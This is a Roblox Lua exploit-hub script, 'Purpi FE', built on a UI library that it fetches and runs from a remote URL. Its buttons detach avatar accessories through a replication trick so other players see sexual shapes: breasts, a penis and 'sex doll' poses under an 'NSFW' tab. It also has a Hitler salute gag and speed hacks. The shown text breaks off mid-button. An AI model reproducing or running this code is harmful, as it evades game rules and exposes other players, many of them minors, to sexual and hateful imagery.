local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Purpi FE", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

OrionLib:MakeNotification({
	Name = "Hello",
	Content = "This Hub Is Made By 多分 Purpi#2894",
	Image = "rbxassetid://4483345998",
	Time = 5
})



local Tab = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Made By 多分 Purpi#2894!"
})

--[[
Name = <string> - The name of the section.
]]
--

--Fe Scripts

local Tab = Window:MakeTab({
	Name = "NSFW",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
	})
	
	local Section = Tab:AddSection({
	Name = "Warning! NSFW"
})



Tab:AddButton({
	Name = "Small Tiddies (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local Hat = HatChar:FindFirstChild("Racing Helmet Flames").Handle --HAT MESH NAME HERE

Hat.Mesh:Destroy()

Hat:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat.CFrame = char.Torso.CFrame * CFrame.new(0.6,0.3,-0.55)
end)


-- Hat 2


local Hat2 = HatChar:FindFirstChild("Racing Helmet USA").Handle --HAT MESH NAME HERE

Hat2.Mesh:Destroy()

Hat2:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat2.CFrame = char.Torso.CFrame * CFrame.new(-0.6,0.3,-0.55)
end)

-- Hat 3

local Hat3 = HatChar:FindFirstChild("FluffyEarringsAccessory").Handle --HAT MESH NAME HERE


Hat3:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat3.CFrame = char.Torso.CFrame * CFrame.new(0,0.4,-0.75) * CFrame.Angles(20,0,0)
end)
  	end    
})

Tab:AddButton({
	Name = "Big Tiddies (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local tit1 = HatChar:FindFirstChild("Space Cop").Handle --HAT MESH NAME HERE

tit1.Mesh:Destroy()

tit1:BreakJoints()

game.RunService.Heartbeat:Connect(function()
tit1.CFrame = char.Torso.CFrame * CFrame.new(0.6,0.1,-0.7)
end)


-- Hat 2


local tit2 = HatChar:FindFirstChild("SpaceHelmetB").Handle --HAT MESH NAME HERE

tit2.Mesh:Destroy()

tit2:BreakJoints()

game.RunService.Heartbeat:Connect(function()
tit2.CFrame = char.Torso.CFrame * CFrame.new(-0.6,0.1,-0.7)
end)

-- Hat 3

local pim3 = HatChar:FindFirstChild("FluffyEarringsAccessory").Handle --HAT MESH NAME HERE


pim3:BreakJoints()

game.RunService.Heartbeat:Connect(function()
pim3.CFrame = char.Torso.CFrame * CFrame.new(0,0.3,-1.47) * CFrame.Angles(20,0,0)
end)








  	end    
})

Tab:AddButton({
	Name = "Dick (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local Hat = HatChar:FindFirstChild("Rainbow Katana").Handle --HAT MESH NAME HERE

Hat.SpecialMesh:Destroy()

Hat:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat.CFrame = char.Torso.CFrame * CFrame.new(0,-0.7,-1.7) * CFrame.Angles(1.6,0,0)
end)


--Hat2

local Hat2 = HatChar:FindFirstChild("Ethereal Katana").Handle --HAT MESH NAME HERE

Hat2.SpecialMesh:Destroy()

Hat2:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Hat2.CFrame = char.Torso.CFrame * CFrame.new(0,-0.6,-5) * CFrame.Angles(1.6,0,0)
end)


--Hat3

local Ball1 = HatChar:FindFirstChild("Space Cop").Handle --HAT MESH NAME HERE

Ball1.Mesh:Destroy()

Ball1:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Ball1.CFrame = char.Torso.CFrame * CFrame.new(0.7,-1.4,-1)
end)


--Hat4

local Ball2 = HatChar:FindFirstChild("SpaceHelmetB").Handle --HAT MESH NAME HERE

Ball2.Mesh:Destroy()

Ball2:BreakJoints()

game.RunService.Heartbeat:Connect(function()
Ball2.CFrame = char.Torso.CFrame * CFrame.new(-0.7,-1.4,-1)
end)

--Hat5

local pptop = HatChar:FindFirstChild("Mushroom").Handle --HAT MESH NAME HERE


pptop:BreakJoints()

game.RunService.Heartbeat:Connect(function()
pptop.CFrame = char.Torso.CFrame * CFrame.new(0,-0.6,-7) * CFrame.Angles(-1.6,0,0)
end)


  	end    
})


Tab:AddButton({
	Name = "Sex Doll (blowjob) (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdollhead = char:FindFirstChild("LooseSideBuns").Handle
bdollhead:BreakJoints()



game.RunService.Heartbeat:Connect(function()
bdollhead.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdollhead.CFrame = char.Torso.CFrame * CFrame.new(0,-1,-1.3) * CFrame.Angles(0,3.15,0)
else
bdollhead.CFrame = char.Torso.CFrame * CFrame.new(0,-1,-2) * CFrame.Angles(0,3.15,0)
end end)




--Torso

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdolltorso = char:FindFirstChild("LongHairHeadBand Black").Handle
bdolltorso:BreakJoints()

bdolltorso.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdolltorso.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdolltorso.CFrame = char.Torso.CFrame * CFrame.new(0,-2.2,-1.4) * CFrame.Angles(0,1.57,0)
else
bdolltorso.CFrame = char.Torso.CFrame * CFrame.new(0,-2.2,-2) * CFrame.Angles(0,1.57,0)
end end)


--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdollrarm = char:FindFirstChild("Hat1").Handle
bdollrarm:BreakJoints()

bdollrarm.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdollrarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdollrarm.CFrame = char.Torso.CFrame * CFrame.new(-1.2,-1.2,-1) * CFrame.Angles(-0.7,0,0)
else
bdollrarm.CFrame = char.Torso.CFrame * CFrame.new(-1.2,-1.4,-1.3) * CFrame.Angles(0,0.3,0)
end end)


--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdolllarm = char:FindFirstChild("Pal Hair").Handle
bdolllarm:BreakJoints()

bdolllarm.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdolllarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdolllarm.CFrame = char.Torso.CFrame * CFrame.new(1.2,-1.2,-1) * CFrame.Angles(-0.7,0,0)
else
bdolllarm.CFrame = char.Torso.CFrame * CFrame.new(1.2,-1.4,-1.3) * CFrame.Angles(0,-0.3,0)
end end)


--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdollrleg = char:FindFirstChild("LavanderHair").Handle
bdollrleg:BreakJoints()

bdollrleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdollrleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdollrleg.CFrame = char.Torso.CFrame * CFrame.new(-1.2,-2.7,-0.8) * CFrame.Angles(0,-0.3,0)
else
bdollrleg.CFrame = char.Torso.CFrame * CFrame.new(-1.2,-2.7,-1.3) * CFrame.Angles(0,-0.3,0)
end end)


--Left Leg


local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdolllleg = char:FindFirstChild("Pink Hair").Handle
bdolllleg:BreakJoints()

bdolllleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdolllleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdolllleg.CFrame = char.Torso.CFrame * CFrame.new(1.2,-2.7,-0.8) * CFrame.Angles(0,0.3,0)
else
bdolllleg.CFrame = char.Torso.CFrame * CFrame.new(1.2,-2.7,-1.3) * CFrame.Angles(0,0.3,0)
end end)


--Dollpp


local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdollpp = char:FindFirstChild("Meshes/DB12Accessory").Handle
bdollpp:BreakJoints()

bdollpp.SpecialMesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdollpp.Velocity = Vector3.new(30,0,0)


bdollpp.CFrame = char.Torso.CFrame * CFrame.new(0,-0.8,-0.75) * CFrame.Angles(0.2,0,0)
end)


--Doll Ass Right

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdollrbut = char:FindFirstChild("Space Cop").Handle
bdollrbut:BreakJoints()

bdollrbut.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdollrbut.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdollrbut.CFrame = char.Torso.CFrame * CFrame.new(-0.5,-2.9,-1.8) * CFrame.Angles(0,1.57,0)
else
bdollrbut.CFrame = char.Torso.CFrame * CFrame.new(-0.5,-2.9,-2.5) * CFrame.Angles(0,1.57,0)
end end)


--Doll Ass Left

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bdolllbut = char:FindFirstChild("SpaceHelmetB").Handle
bdolllbut:BreakJoints()

bdolllbut.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
bdolllbut.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
bdolllbut.CFrame = char.Torso.CFrame * CFrame.new(0.5,-2.9,-1.8) * CFrame.Angles(0,1.57,0)
else
bdolllbut.CFrame = char.Torso.CFrame * CFrame.new(0.5,-2.9,-2.5) * CFrame.Angles(0,1.57,0)
end end)



  	end    
})


Tab:AddButton({
	Name = "Sex Doll (doggy) (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdollhead = char:FindFirstChild("LooseSideBuns").Handle
dogdollhead:BreakJoints()



game.RunService.Heartbeat:Connect(function()
dogdollhead.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdollhead.CFrame = char.Torso.CFrame * CFrame.new(0,-1.3,-3.6) * CFrame.Angles(-1.6,0,0)
else
dogdollhead.CFrame = char.Torso.CFrame * CFrame.new(0,-1.3,-4.5) * CFrame.Angles(-1.6,0,0)
end end)




--Torso

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdolltorso = char:FindFirstChild("LongHairHeadBand Black").Handle
dogdolltorso:BreakJoints()

dogdolltorso.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdolltorso.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdolltorso.CFrame = char.Torso.CFrame * CFrame.new(0,-1.4,-2.6) * CFrame.Angles(-1.7,1.57,0)
else
dogdolltorso.CFrame = char.Torso.CFrame * CFrame.new(0,-1.4,-3.5) * CFrame.Angles(-1.7,1.57,0)
end end)


--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdollrarm = char:FindFirstChild("Hat1").Handle
dogdollrarm:BreakJoints()

dogdollrarm.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdollrarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdollrarm.CFrame = char.Torso.CFrame * CFrame.new(1,-2,-4.1) * CFrame.Angles(-0.7,0.4,0)
else
dogdollrarm.CFrame = char.Torso.CFrame * CFrame.new(1,-2,-5) * CFrame.Angles(-0.7,0.4,0)
end end)


--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdolllarm = char:FindFirstChild("Pal Hair").Handle
dogdolllarm:BreakJoints()

dogdolllarm.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdolllarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdolllarm.CFrame = char.Torso.CFrame * CFrame.new(-1,-2,-4.1) * CFrame.Angles(-0.7,-0.4,0)
else
dogdolllarm.CFrame = char.Torso.CFrame * CFrame.new(-1,-2,-5) * CFrame.Angles(-0.7,-0.4,0)
end end)


--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdollrleg = char:FindFirstChild("LavanderHair").Handle
dogdollrleg:BreakJoints()

dogdollrleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdollrleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdollrleg.CFrame = char.Torso.CFrame * CFrame.new(-0.9,-2.2,-0.8) * CFrame.Angles(1.1,-0.1,0)
else
dogdollrleg.CFrame = char.Torso.CFrame * CFrame.new(-0.9,-2.2,-1.7) * CFrame.Angles(1.1,-0.1,0)
end end)


--Left Leg


local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdolllleg = char:FindFirstChild("Pink Hair").Handle
dogdolllleg:BreakJoints()

dogdolllleg.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdolllleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdolllleg.CFrame = char.Torso.CFrame * CFrame.new(0.9,-2.2,-0.8) * CFrame.Angles(1.1,0.1,0)
else
dogdolllleg.CFrame = char.Torso.CFrame * CFrame.new(0.9,-2.2,-1.7) * CFrame.Angles(1.1,0.1,0)
end end)


--Dollpp


local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdollpp = char:FindFirstChild("Meshes/DB12Accessory").Handle
dogdollpp:BreakJoints()

dogdollpp.SpecialMesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdollpp.Velocity = Vector3.new(30,0,0)


dogdollpp.CFrame = char.Torso.CFrame * CFrame.new(0,-0.8,-0.75) * CFrame.Angles(0.2,0,0)
end)


--Doll Ass Right

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdollrbut = char:FindFirstChild("Space Cop").Handle
dogdollrbut:BreakJoints()

dogdollrbut.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdollrbut.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdollrbut.CFrame = char.Torso.CFrame * CFrame.new(-0.6,-0.7,-1) * CFrame.Angles(0,1.57,0)
else
dogdollrbut.CFrame = char.Torso.CFrame * CFrame.new(-0.6,-0.7,-1.9) * CFrame.Angles(0,1.57,0)
end end)


--Doll Ass Left

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local dogdolllbut = char:FindFirstChild("SpaceHelmetB").Handle
dogdolllbut:BreakJoints()

dogdolllbut.Mesh:Destroy()

game.RunService.Heartbeat:Connect(function()
dogdolllbut.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
dogdolllbut.CFrame = char.Torso.CFrame * CFrame.new(0.6,-0.7,-1) * CFrame.Angles(0,1.57,0)
else
dogdolllbut.CFrame = char.Torso.CFrame * CFrame.new(0.6,-0.7,-1.9) * CFrame.Angles(0,1.57,0)
end end)



  	end    
})

Tab:AddButton({
	Name = "comming soon (R6)",
	Callback = function()
      		print("button pressed")
      		
  	end    
})

local Tab = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
	})
	
	local Section = Tab:AddSection({
	Name = "Scripts!"
})

Tab:AddButton({
	Name = "Gilbert (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100

local HatChar = game.Players.LocalPlayer.Character
local gilbertbody = HatChar:FindFirstChild("Meshes/CrateAccessory").Handle --HAT MESH NAME HERE

gilbertbody.SpecialMesh:Destroy()

gilbertbody:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    gilbertbody.Velocity = Vector3.new(30,0,0)
gilbertbody.CFrame = char.Torso.CFrame * CFrame.new(0,1,0)
end)


-- Arms

local plr = game.Players.LocalPlayer
local char = plr.Character

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.CFrame = char.Torso.CFrame * CFrame.new(0,-100,0)
end)

-- Left
local plr = game.Players.LocalPlayer
local char = plr.Character

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
larm.CFrame = char.Torso.CFrame * CFrame.new(0,-100,0)
end)

-- Tail

local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local gilberttail = HatChar:FindFirstChild("Many Fox Tails").Handle --HAT MESH NAME HERE



gilberttail:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    gilberttail.Velocity = Vector3.new(30,0,0)
gilberttail.CFrame = char.Torso.CFrame * CFrame.new(0,1,2.5) * CFrame.Angles(0,3.25,0)
end)


--Eye 

local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local gilberteye = HatChar:FindFirstChild("MeshPartAccessory").Handle --HAT MESH NAME HERE



gilberteye:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    gilberteye.Velocity = Vector3.new(30,0,0)
gilberteye.CFrame = char.Torso.CFrame * CFrame.new(0,1.5,-2) * CFrame.Angles(0,0,0)
end)


--Hat

local plr = game.Players.LocalPlayer
local char = plr.Character

local HatChar = game.Players.LocalPlayer.Character
local gilberthat = HatChar:FindFirstChild("gradcap_18").Handle --HAT MESH NAME HERE



gilberthat:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    gilberthat.Velocity = Vector3.new(30,0,0)
gilberthat.CFrame = char.Torso.CFrame * CFrame.new(0,2.7,0) * CFrame.Angles(0,0,0)
end)
  	end    
})

Tab:AddButton({
	Name = "BMX (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local bmxbike = char:FindFirstChild("Back Bike").Handle
bmxbike:BreakJoints()

game.RunService.Heartbeat:Connect(function()
bmxbike.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
bmxbike.CFrame = char.Torso.CFrame * CFrame.new(0,-0.8,-1) * CFrame.Angles(0.1,3.1,0)
else
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 75
bmxbike.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,-0.5) * CFrame.Angles(-0.2,3.1,0)
end end)


--Left Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
lleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
lleg.CFrame = char.Torso.CFrame * CFrame.new(-1,-1.7,-0.5) * CFrame.Angles(0.7,0,-0.4)
else
lleg.CFrame = char.Torso.CFrame * CFrame.new(-1,-1.7,0) * CFrame.Angles(0,0,-0.4)
end end)


--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rleg.CFrame = char.Torso.CFrame * CFrame.new(1,-1.7,-0.5) * CFrame.Angles(0.7,0,0.4)
else
rleg.CFrame = char.Torso.CFrame * CFrame.new(1,-1.7,0) * CFrame.Angles(0,0,0.4)
end end)


--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local llarm = char:FindFirstChild("Left Arm")
llarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
llarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
llarm.CFrame = char.Torso.CFrame * CFrame.new(-1,0.6,-1) * CFrame.Angles(2,0,0.3)
else
llarm.CFrame = char.Torso.CFrame * CFrame.new(-1,0.5,-1) * CFrame.Angles(1.3,0,0.3)
end end)





--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(1,0.6,-1) * CFrame.Angles(2,0,-0.3)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1,0.5,-1) * CFrame.Angles(1.3,0,-0.3)
end end)





  	end    
})

Tab:AddButton({
	Name = "Hitler (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character

local hmu = char:FindFirstChild("MeshPartAccessory").Handle
hmu:BreakJoints()

game.RunService.Heartbeat:Connect(function()
    hmu.Velocity = Vector3.new(30,0,0)
hmu.CFrame = char.Head.CFrame * CFrame.new(0,0.2,-0.4) * CFrame.Angles(1,0,0)
end)

--Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0.9,-0.6) * CFrame.Angles(2,0,0)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0,0)
end end)
  	end    
})

Tab:AddButton({
	Name = "Burger Plate (R6)",
	Callback = function()
      		print("button pressed")
      		local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local burger = char:FindFirstChild("Burger Tophat").Handle
burger:BreakJoints()

game.RunService.Heartbeat:Connect(function()
burger.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
burger.CFrame = char.Torso.CFrame * CFrame.new(0,100,0)
else
burger.CFrame = char.Torso.CFrame * CFrame.new(0,1.4,-1.5)
end end)


--Right Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0,0)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.2,0.5,-0.7) * CFrame.Angles(1.5,0,-0.4)
end end)

--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
larm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.5,0,0)
else
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.2,0.5,-0.7) * CFrame.Angles(1.5,0,0.4)
end end)
  	end    
})

Tab:AddButton({
	Name = "Pink Car (R6)",
	Callback = function()
      		print("button pressed")
      		--Car

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 250
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0

local pcar = char:FindFirstChild("Pink Plastic Toy Car").Handle
pcar:BreakJoints()

game.RunService.Heartbeat:Connect(function()
pcar.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
pcar.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,2)
else
pcar.CFrame = char.Torso.CFrame * CFrame.new(0,-1.5,0)
end end)

--Right arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rarm = char:FindFirstChild("Right Arm")
rarm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rarm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0,0.5) * CFrame.Angles(-0.9,0,0.3)
else
rarm.CFrame = char.Torso.CFrame * CFrame.new(1.5,0.3,-0.5) * CFrame.Angles(0.8,0.3,0)
end end)

--Left Arm

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local larm = char:FindFirstChild("Left Arm")
larm:BreakJoints()

game.RunService.Heartbeat:Connect(function()
larm.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.5,0,0.5) * CFrame.Angles(-0.9,0,-0.3)
else
larm.CFrame = char.Torso.CFrame * CFrame.new(-1.5,0.3,-0.5) * CFrame.Angles(0.8,-0.3,0)
end end)

--Right Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local rleg = char:FindFirstChild("Right Leg")
rleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
rleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
rleg.CFrame = char.Torso.CFrame * CFrame.new(0.8,-1.8,-0.7) * CFrame.Angles(0.9,0,0.3)
else
rleg.CFrame = char.Torso.CFrame * CFrame.new(1.5,-1.5,0) * CFrame.Angles(0,0,0.5)
end end)

--Left Leg

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false

local lleg = char:FindFirstChild("Left Leg")
lleg:BreakJoints()

game.RunService.Heartbeat:Connect(function()
lleg.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
lleg.CFrame = char.Torso.CFrame * CFrame.new(-0.8,-1.8,-0.7) * CFrame.Angles(0.9,0,-0.3)
else
lleg.CFrame = char.Torso.CFrame * CFrame.new(-1.5,-1.5,0) * CFrame.Angles(0,0,-0.5)
end end)

--Fire

local plr = game.Players.LocalPlayer
local char = plr.Character
local Toggle = false


local firem = char:FindFirstChild("FireMohawk").Handle
firem:BreakJoints()

game.RunService.Heartbeat:Connect(function()
firem.Velocity = Vector3.new(30,0,0)
plr:GetMouse().KeyDown:Connect(function(KEY)
if KEY == "e" then if Toggle == true then Toggle = false else Toggle = true end end end) 

if Toggle == true then
firem.CFrame = char.Torso.CFrame * CFrame.new(0,-2.5,0.15)
else
firem.CFrame = char.Torso.CFrame * CFrame.new(0,-2.5,-1.7)
end end)
  	end    
})

Tab:AddButton({
	Name = "Water Biker (R6)",
	Callback = function()
      		print("button pressed")
      		--Bike
local plr = game.Players.LocalPlayer
local char = plr.Character

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 200
